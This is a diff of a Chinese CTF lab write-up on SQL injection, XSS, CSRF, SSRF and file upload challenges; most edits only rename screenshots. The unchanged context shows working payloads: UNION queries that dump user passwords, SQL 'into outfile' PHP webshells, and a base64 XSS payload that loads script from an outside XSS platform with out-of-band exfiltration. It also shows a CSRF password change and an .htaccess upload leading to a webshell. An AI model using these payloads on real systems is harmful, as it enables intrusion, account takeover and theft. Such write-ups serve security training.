@@ -27,7 +27,7 @@ draft: false
 ?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database();
 ```
 
-![image-20251219085204061](./../../../public/pcb5-ez_java/image-20251219085204061-1766366158615-1.png)
+![image-20251219085204061](./../../../public/pcb5-ez_java/image-20251219085204061-1766372386707-1.png)
 
 查询users表的所有列名
 
@@ -35,7 +35,7 @@ draft: false
 ?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27and%20table_schema=database();
 ```
 
-![image-20251219085408661](./../../../public/pcb5-ez_java/image-20251219085408661-1766366158616-2.png)
+![image-20251219085408661](./../../../public/pcb5-ez_java/image-20251219085408661-1766372386707-3.png)
 
 查询users表的信息
 
@@ -43,13 +43,13 @@ draft: false
 ?id=-1%20union%20select%201,2,group_concat(id,%27-%27,username,%27-%27,password)%20from%20users;
 ```
 
-![image-20251219085524226](./../../../public/pcb5-ez_java/image-20251219085524226-1766366158616-3.png)
+![image-20251219085524226](./../../../public/pcb5-ez_java/image-20251219085524226-1766372386707-2.png)
 
 CTF{admin_secret_password}
 
 ## 布尔盲注爆破
 
-![image-20251219112353769](./../../../public/pcb5-ez_java/image-20251219112353769-1766366158616-4.png)
+![image-20251219112353769](./../../../public/pcb5-ez_java/image-20251219112353769-1766372386707-4.png)
 
 稳定脚本
 
@@ -262,7 +262,7 @@ password=;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e into outfile
 
 1=system("ls");
 
-![image-20251219113253106](./../../../public/pcb5-ez_java/image-20251219113253106-1766366158616-6.png)
+![image-20251219113253106](./../../../public/pcb5-ez_java/image-20251219113253106-1766372386707-6.png)
 
 CTF{sql_injection_is_fun}
 
@@ -403,27 +403,27 @@ if __name__ == "__main__":
 
 
 
-![image-20251219114001869](./../../../public/pcb5-ez_java/image-20251219114001869-1766366158616-13.png)
+![image-20251219114001869](./../../../public/pcb5-ez_java/image-20251219114001869-1766372386707-7.png)
 
 CTF{bool_sql_injection_bypass_is_fun}
 
 # 第六章 XSS攻击与防御
 
-## 存储反射混合型XSS
+## 混合型XSS
 
 先注册一个账号登录，测试发现设置个性签名处存在xss漏洞
 
 我们在/profile路由可以发现账密，所以我们只需在管理员点击后访问/profile路由，即可得到管理员账密
 
-![image-20251221192638822](./../../../public/pcb5-ez_java/image-20251221192638822-1766366158616-5.png)
+![image-20251221192638822](./../../../public/pcb5-ez_java/image-20251221192638822-1766372386707-5.png)
 
 先保存再点管理员签名
 
-![image-20251221192326071](./../../../public/pcb5-ez_java/image-20251221192326071-1766366158616-7.png)
+![image-20251221192326071](./../../../public/pcb5-ez_java/image-20251221192326071-1766372386707-8.png)
 
 这里使用XSS平台 https://xssaq.com/ 
 
-![image-20251221192242576](./../../../public/pcb5-ez_java/image-20251221192242576-1766366158616-8.png)
+![image-20251221192242576](./../../../public/pcb5-ez_java/image-20251221192242576-1766372386707-13.png)
 
 ```
 (async () => {
@@ -451,31 +451,31 @@ CTF{bool_sql_injection_bypass_is_fun}
 
 使用 https://pipedream.com/ 进行HTTP带外
 
-![image-20251221192206852](./../../../public/pcb5-ez_java/image-20251221192206852-1766366158616-9.png)
+![image-20251221192206852](./../../../public/pcb5-ez_java/image-20251221192206852-1766372386707-9.png)
 
 得到flag
 
 ctfshow{532a7097-527b-4b7b-ac6a-0b5bc7dce055}
 
-## 字符编码绕过
+## 编码绕过XSS过滤
 
 和上一个基本相同，但是对script和/进行了过滤
 
 我们用编写的payload绕过
 
-![image-20251221194528108](./../../../public/pcb5-ez_java/image-20251221194528108-1766366158616-10.png)
+![image-20251221194528108](./../../../public/pcb5-ez_java/image-20251221194528108-1766372386707-10.png)
 
 ```
 <svg onload=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPScvL3hzLnBlL21HZSc7'))>
 ```
 
-![image-20251221210310193](./../../../public/pcb5-ez_java/image-20251221210310193-1766366158616-11.png)
+![image-20251221210310193](./../../../public/pcb5-ez_java/image-20251221210310193-1766372386707-11.png)
 
 ctfshow{39311769-5d8b-4f7b-9655-1ee5a4dd6f27}
 
 # 第七章 请求伪造漏洞（CSRF/SSRF）
 
-## CSRF静默修改管理员密码
+## 请求伪造漏洞_CSRF
 
 ```
 <div class="mb-3">
@@ -536,7 +536,7 @@ ctfshow{39311769-5d8b-4f7b-9655-1ee5a4dd6f27}
 
 我们尝试登录，发现无法利用
 
-![image-20251221211843398](./../../../public/pcb5-ez_java/image-20251221211843398-1766366158616-12.png)
+![image-20251221211843398](./../../../public/pcb5-ez_java/image-20251221211843398-1766372386707-12.png)
 
 我们进行二次xss，获取csrf_token，并发给攻击网址
 
@@ -572,11 +572,11 @@ fetch('http://127.0.0.1:4476/modify', {
     </script>
 ```
 
-![image-20251221205904147](./../../../public/pcb5-ez_java/image-20251221205904147-1766366158616-14.png)
+![image-20251221205904147](./../../../public/pcb5-ez_java/image-20251221205904147-1766372386707-14.png)
 
 成功修改管理员密码
 
-![image-20251221205759397](./../../../public/pcb5-ez_java/image-20251221205759397-1766366158616-15.png)
+![image-20251221205759397](./../../../public/pcb5-ez_java/image-20251221205759397-1766372386707-16.png)
 
 ctfshow{d9ddfedb-db4e-4851-8246-4f1fe57e8e72}
 
@@ -584,7 +584,7 @@ ctfshow{d9ddfedb-db4e-4851-8246-4f1fe57e8e72}
 
 strlen($host) <= 5
 
-![image-20251221213026485](./../../../public/pcb5-ez_java/image-20251221213026485-1766366158616-22.png)
+![image-20251221213026485](./../../../public/pcb5-ez_java/image-20251221213026485-1766372386707-15.png)
 
 url=http://0/flag.php
 
@@ -592,9 +592,9 @@ url=http://0/flag.php
 
 工具生成payload
 
-![image-20251221214827915](./../../../public/pcb5-ez_java/image-20251221214827915-1766366158616-17.png)
+![image-20251221214827915](./../../../public/pcb5-ez_java/image-20251221214827915-1766372386707-17.png)
 
-![image-20251221222147141](./../../../public/pcb5-ez_java/image-20251221222147141-1766366158616-16.png)
+![image-20251221222147141](./../../../public/pcb5-ez_java/image-20251221222147141-1766372386707-18.png)
 
 flag在 /flaaag
 
@@ -606,11 +606,11 @@ ctfshow{10de5bdd-f16b-4b48-bea8-63a28ece6d20}
 
 这里对Content-Type进行校验
 
-![image-20251222081649789](./../../../public/pcb5-ez_java/image-20251222081649789-1766366158616-18.png)
+![image-20251222081649789](./../../../public/pcb5-ez_java/image-20251222081649789-1766372386707-20.png)
 
 得到flag
 
-![image-20251222081656860](./../../../public/pcb5-ez_java/image-20251222081656860-1766366158616-20.png)
+![image-20251222081656860](./../../../public/pcb5-ez_java/image-20251222081656860-1766372386707-19.png)
 
 ctfshow{10765e65-dbd4-4316-a487-ed64b4b02109}
 
@@ -626,11 +626,11 @@ SetHandler application/x-httpd-php
 
 然后再上传木马
 
-![image-20251222082151684](./../../../public/pcb5-ez_java/image-20251222082151684-1766366158616-19.png)
+![image-20251222082151684](./../../../public/pcb5-ez_java/image-20251222082151684-1766372386707-23.png)
 
 蚁剑连接得到flag
 
-![image-20251222082158972](./../../../public/pcb5-ez_java/image-20251222082158972-1766366158616-21.png)
+![image-20251222082158972](./../../../public/pcb5-ez_java/image-20251222082158972-1766372386707-21.png)
 
 ctfshow{4ac6e2a9-bbf3-44c9-acc9-d2a566dfd142}
 
@@ -638,18 +638,20 @@ ctfshow{4ac6e2a9-bbf3-44c9-acc9-d2a566dfd142}
 
 使用exiftool将jpg转成这种格式
 
-![image-20251222091338839](./../../../public/pcb5-ez_java/image-20251222091338839-1766366158616-23.png)
+![image-20251222091338839](./../../../public/pcb5-ez_java/image-20251222091338839-1766372386707-22.png)
 
 ```
 C64File "');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1.php';--+
 ```
 
-上传![image-20251222091432045](./../../../public/pcb5-ez_java/image-20251222091432045-1766366158616-24.png)
+上传![image-20251222091432045](./../../../public/pcb5-ez_java/image-20251222091432045-1766372386707-25.png)
 
 在1.php自动生成后门文件
 
-![image-20251222091152404](./../../../public/pcb5-ez_java/image-20251222091152404-1766366158616-25.png)
+![image-20251222091152404](./../../../public/pcb5-ez_java/image-20251222091152404-1766372386707-24.png)
 
 ctfshow{2a405738-c872-412b-9f5e-57e422864fb4}
+
+
 
 ![image-20251222092031208](./../../../public/pcb5-ez_java/image-20251222092031208.png)
